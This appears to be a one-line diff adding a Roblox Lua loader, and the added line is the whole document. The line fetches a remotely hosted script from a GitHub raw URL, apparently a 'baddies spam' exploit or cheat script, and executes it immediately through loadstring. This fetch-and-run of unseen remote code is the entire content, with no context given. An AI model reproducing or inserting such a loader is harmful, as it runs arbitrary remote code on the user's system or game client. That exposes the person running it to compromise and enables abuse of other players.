@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestBaseDuel/loaders/main/loaders/baddies-spam6-hfpxjc3lhxboqx.lua"))()
